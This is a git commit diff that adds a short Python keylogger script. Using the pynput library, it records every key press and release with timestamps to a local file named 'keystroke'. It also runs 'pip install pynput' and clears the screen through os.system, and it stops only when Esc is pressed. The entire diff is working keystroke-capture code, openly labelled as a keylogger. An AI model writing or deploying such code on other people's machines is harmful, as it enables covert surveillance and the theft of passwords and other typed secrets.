edadfe13fa4b68a895ee6c537c7a3f6fe085d6d0
prabhatmalhan <prabhat.malhan7@gmail.com>
2020-05-31 07:56:46 +0530

    Create keylogger.py

---
+++ Keylogger/keylogger.py
@@ -0,0 +1,17 @@
+from pynput.keyboard import Key, Listener
+from os import system as syst
+import logging
+
+logging.basicConfig(filename='keystroke' , level = logging.DEBUG , format = '%(asctime)s : %(message)s')
+
+def on_press(key) :
+	logging.info('\t'+str(key))
+
+def on_release(key) :
+	logging.info('\t'*4+str(key))
+	if key == Key.esc :
+		return False
+syst('pip install pynput')
+syst('cls')
+with Listener(on_press=on_press,on_release=on_release) as listener :
+	listener.join()
